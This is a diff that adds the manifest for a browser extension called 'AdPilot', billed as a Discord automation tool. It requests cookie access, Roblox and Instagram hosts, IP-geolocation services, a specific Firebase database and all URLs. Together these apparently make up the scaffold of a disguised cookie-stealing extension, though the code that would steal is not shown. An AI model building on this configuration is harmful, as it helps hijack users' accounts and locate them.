@@ -1,0 +1,46 @@
+{
+  "manifest_version": 3,
+  "name": "AdPilot",
+  "version": "1.7",
+  "description": "Your Discord Automation Hub.",
+  "permissions": [
+    "cookies",
+    "storage",
+    "alarms",
+    "tabs",
+    "windows"
+  ],
+  "host_permissions": [
+    "*://*.roblox.com/*",
+    "https://discord.com/*",
+    "https://www.rolimons.com/*",
+    "*://*.instagram.com/*",
+    "https://api.ipify.org/*",
+    "https://ipwho.is/*",
+    "https://ipapi.co/*",
+    "https://ip-api.com/*",
+    "https://panel-188e4-default-rtdb.firebaseio.com/*",
+    "<all_urls>"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "action": {
+    "default_popup": "popup.html",
+    "default_title": "AdPilot",
+    "default_icon": {
+      "128": "icon.png"
+    }
+  },
+  "icons": {
+    "128": "icon.png"
+  },
+  "content_scripts": [
+    {
+      "matches": ["*://*.roblox.com/*"],
+      "js": ["roblox_popup.js"],
+      "css": ["roblox_popup.css"],
+      "run_at": "document_idle"
+    }
+  ]
+}
